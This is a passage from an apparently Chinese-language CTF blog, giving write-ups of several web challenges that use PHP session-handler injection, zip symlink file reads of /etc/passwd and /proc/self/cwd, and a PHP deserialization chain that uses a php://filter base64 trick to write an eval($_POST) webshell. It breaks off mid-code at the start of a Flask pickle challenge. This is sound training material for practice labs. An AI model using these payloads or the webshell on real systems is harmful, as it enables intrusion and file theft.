<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>  <span class="hljs-variable">$note</span> = <span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-variable">$note</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>);<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>); <span class="hljs-comment">// delete suspicious characters</span><br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$index&#125;</span>_<span class="hljs-subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$note</span>));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里<code>title</code>完全可控：</p>
<p><img src="/img/SWPU2019Web34.png" srcset="/img/loading.gif" lazyload alt="SWPU2019Web34"></p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">session.serialize_handler   <span class="hljs-built_in">string</span> <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字。默认使用php</span><br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br></code></pre></td></tr></table></figure>

<p>构造一个内容为<code>|N;admin|b:1;</code>的数据，<code>|N;</code>将前面的杂乱的数据作为一个键解决掉。</p>
<p>综上，构造<code>payload</code>步骤：</p>
<p>用户名<code>sess_</code>，<code>title</code>为<code>|N;admin|b:1;</code>。导出后抓包修改对应<code>PHPSESSIONID</code>即可。</p>
<h4 id="思路总结：-6"><a href="#思路总结：-6" class="headerlink" title="思路总结："></a>思路总结：</h4><p><code>session</code>文件名，反序列化引擎。</p>
<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">参考资料</a></p>
<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>明文传输用户名和密码，而且这个cookie看着像<code>JWT</code>：</p>
<p><img src="/img/SWPU2019Web31.png" srcset="/img/loading.gif" lazyload alt="SWPU2019Web31"></p>
<p>后续：靶场有问题，登录不上去。直接看了其它师傅的wp:</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105666388">参考资料</a></p>
<p><a target="_blank" rel="noopener" href="https://hwlanxiaojun.github.io/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/#0x-05-SWPU2019-Web3">参考资料</a></p>
<p>登录后会出现上传功能，但会提示权限不够。伪造session需要key，这个key在访问不存在的页面时被放到请求头里了，然后就是常规的session伪造。上传界面右键存在源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template_string(temp)<br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        m = hashlib.md5()<br>        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span><br>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        m.update(name)<br>        md5_one= m.hexdigest()<br>        n = hashlib.md5()<br>        ip = request.remote_addr<br>        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        n.update(ip)<br>        md5_ip = n.hexdigest()<br>        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        basepath=os.path.dirname(os.path.realpath(__file__))<br>        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span><br>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span><br>        filename = f.filename<br>        pathname = path+filename<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]: <span class="hljs-comment">#按.分割filename，然后取最后一个元素判断是否为split</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path_base)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):<br>            <span class="hljs-keyword">try</span>:<br>                f.save(pathname)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname<br>            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>				waf()<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            os.system(cmd)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)<br>        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                shutil.rmtree(path_base)<br>                os.mkdir(path_base)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>            resp = make_response(image)<br>            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            shutil.rmtree(path_base)<br>            os.mkdir(path_base)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/showflag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">showflag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:<br>        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()<br>        resp = make_response(image)<br>        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -s是Linux的一种软连接,类似与windows的快捷方式<br>ln -s <span class="hljs-regexp">/etc/</span>passwd forever404 这会出现一个forever404文本,里面包含密码<br><span class="hljs-regexp">/proc/</span>self 记录了系统运行的信息状态等,cwd 指向当前进程运行目录的一个符号链接,即flask运行进程目录<br><br>ln -s <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag/flag.jpg test<br>zip -ry test.zip test<br>-r：表示递归地包含指定目录下的所有文件和子目录。<br>-y：表示将符号链接（symbolic links）作为符号链接保存，而不解引用它们。这通常用于在 ZIP 文件中保留符号链接的原始状态<br></code></pre></td></tr></table></figure>

<p>这题环境有问题只能这样随便写写了。。</p>
<h4 id="思路总结：-7"><a href="#思路总结：-7" class="headerlink" title="思路总结："></a>思路总结：</h4><p>软链接&#x2F;符号链接？<code>/proc/self/cwd</code>目录？在解压文件时可能会发生什么问题？</p>
<h2 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2><p>?</p>
<p><img src="/img/yangchengbeiser1.png" srcset="/img/loading.gif" lazyload alt="yangchengbeiser1"></p>
<p>存在<code>robots.php</code>，访问：<code>star1.php</code>:</p>
<p><img src="/img/yangchengbeiser2.png" srcset="/img/loading.gif" lazyload alt="yangchengbeiser2"></p>
<p>右键源码，存在：</p>
<p><img src="/img/yangchengbeiser3.png" srcset="/img/loading.gif" lazyload alt="yangchengbeiser3"></p>
<p><code>不安全的协议从我家进入ser.php</code>，最开始试了试<code>http://127.0.0.1/ser.php</code>发现重定向到<code>baidu</code>了，以为这里用的<code>parse_url</code>解析又试了其他的也不行。。后面才知道是火狐的问题，他不允许在这个页面嵌入其它网站的页面导致我一直访问不了这个<code>ser.php</code></p>
<p>直接看的wp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yasuo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hero)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;hero-&gt;<span class="hljs-title function_ invoke__">hasaki</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You don&#x27;t look very happy&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;text = <span class="hljs-variable">$text</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$d</span> = <span class="hljs-string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$d</span> . <span class="hljs-variable language_">$this</span>-&gt;text;<br>        @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yasuo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasaki</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I&#x27;m the best happy windy man&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>Yongen</code>类下提示<code>flag.php</code>，<code>hasaki</code>函数虽然有<code>file_put_contents</code>但存在<code>die</code>这个东西。但：</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/266565.html">死亡绕过</a></p>
<p>综上，exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GWHT</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hero</span><br>        ;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yongen</span></span><br><span class="hljs-class"></span>&#123; <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;text = <span class="hljs-variable">$text</span>;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">GWHT</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yongen</span>();<br><span class="hljs-variable">$a</span> -&gt;hero = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span> -&gt;file = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=r.php&#x27;</span>;<br><span class="hljs-variable">$b</span> -&gt;text = <span class="hljs-string">&#x27;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&#x27;</span>;<span class="hljs-comment">// &lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p>最后有一个注意的点是<code>&lt;?php die(&quot;nononon&quot;);?&gt;</code>这东西包含不符合<code>base64</code>编码的字符范围，相当于解码<code>phpdienononon</code>共13个字符，<code>base64</code>解码时四个比特一组，所以要随便补三个字符。</p>
<p>然后就是传给哪个参数的问题，Arjun直接扫就行(懒得弄了)。</p>
<p>综上：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?path<span class="hljs-operator">=</span>http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/star<span class="hljs-number">1</span>.php&amp;<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>GWHT<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>hero<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Yongen<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>file<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">55</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>php<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Ffilter<span class="hljs-variable">%2</span>Fwrite<span class="hljs-variable">%3</span>Dconvert.base<span class="hljs-number">64</span>-decode<span class="hljs-variable">%2</span>Fresource<span class="hljs-variable">%3</span>Dr.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">4</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>text<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">39</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>aaaPD<span class="hljs-number">9</span>waHAgZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbJ<span class="hljs-number">2</span>EnXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure>

<p>不url编码一下也行：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>ath=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/127.0.0.1/star</span>1.php&amp;c=<span class="hljs-symbol">O:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;GWHT&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;hero&quot;</span></span>;<span class="hljs-symbol">O:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;Yongen&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;file&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">55</span><span class="hljs-symbol">:<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=1.php&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;text&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">39</span><span class="hljs-symbol">:<span class="hljs-string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&quot;</span></span>;&#125;&#125;<br></code></pre></td></tr></table></figure>

<h4 id="思路总结：-8"><a href="#思路总结：-8" class="headerlink" title="思路总结："></a>思路总结：</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(&#x27;<span class="hljs-params">php</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">filter</span><span class="hljs-operator">/</span><span class="hljs-params">write</span>=<span class="hljs-params">convert</span>.<span class="hljs-params">base64</span>-<span class="hljs-params">decode</span><span class="hljs-operator">/</span><span class="hljs-params">resource</span>=<span class="hljs-params">r</span>.<span class="hljs-params">php</span>&#x27;,&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&#x27;)</span><br></code></pre></td></tr></table></figure>

<p>这东西意思是把base64编码后的数据写到<code>r.php</code>中。所以我们可以利用这种方法去绕过类似<code>exit(),die()</code>这种函数(因为被当成base64写到指定文件里了，失去了原本的意义)。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ30I34mwrxiKx&alichlgref=https://www.cnblogs.com/#toc-1">参考文章2</a></p>
<p><a target="_blank" rel="noopener" href="https://xiaolong22333.top/archives/114/">参考文章3</a></p>
<h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>跟着提示做：</p>
<p><img src="/img/hfctf2021final1.png" srcset="/img/loading.gif" lazyload alt="hfctf2021final1"></p>
<p>存在任意文件读取？试试<code>/etc/passwd</code>:</p>
<p><img src="/img/hfctf2021final2.png" srcset="/img/loading.gif" lazyload alt="hfctf2021final2"></p>
<p><img src="/img/hfctf2021final3.png" srcset="/img/loading.gif" lazyload alt="hfctf2021final3"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3.6</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> 